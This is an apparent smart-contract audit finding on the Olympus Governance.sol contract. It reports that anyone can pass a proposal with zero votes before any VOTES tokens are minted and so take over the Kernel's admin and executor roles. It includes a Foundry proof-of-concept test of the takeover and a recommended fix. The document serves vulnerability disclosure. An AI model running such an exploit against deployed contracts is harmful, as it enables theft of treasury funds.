@@ -1,0 +1,15 @@
+[H-02] Anyone can pass any proposal alone before firstVOTESare minted
+Submitted by Bahurum, also found by bin2chen and cryptphi
+https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-L218https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268
+Before anyVOTESare minted anyone can activate and execute an arbitrary proposal even with 0 votes cast. So an attacker can pass any proposal (i.e. change theexecutor+adminof theKernel, gaining access to all permissioned functions and to funds held).
+Proof of Concept
+Checks on vote numbers made inGovernance.solat linesL164,217-218,268pass ifVOTES.totalSupply() == 0. So, until noVOTESare minted, anyone can submit, activate and execute a proposal. There is no need to own or cast votes. This happens ifOlympusGovernanceis granted theexecutorrole before anyVOTESare minted (as inGovernance.t.sol). The attacker can anticipate/frontrun the minting and pass a proposal to change both theKerneladminandexecutor. Then he/she can upgrade malicious modules, steal funds from treasury…
+A PoC was obtained modifying thesetUp()ofGovernance.t.solby keeping only what is before the minting ofVOTES(up toL83included). The test is as follows:
+functiontest_AttackerPassesProposalBeforeMinting()public{address[]memoryusers=userCreator.create(1);addressattacker=users[0];vm.prank(attacker);MockMaliciousattackerControlledContract=newMockMalicious();Instruction[]memoryinstructions_=newInstruction[](2);instructions_[0] =Instruction(Actions.ChangeAdmin,address(attackerControlledContract));instructions_[1] =Instruction(Actions.ChangeExecutor,address(attackerControlledContract));vm.prank(attacker);governance.submitProposal(instructions_,"proposalName","This is the proposal URI");governance.endorseProposal(1);vm.prank(attacker);governance.activateProposal(1);vm.warp(block.timestamp+3days+1);governance.executeProposal();assert(kernel.executor()==address(attackerControlledContract));assert(kernel.admin()==address(attackerControlledContract));}
+with
+contractMockMalicious{}
+Recommended Mitigation Steps
+InGovernance.solcheck for a minimum VOTES totalSupply, similiar to the expected initial supply of VOTES when they have been fairly distributed, for example at lineL164.
+fullyallocated (Olympus) acknowledged
+0xean (judge) commented:
+Leaving as High severity as this shows a clear path to loss of funds.
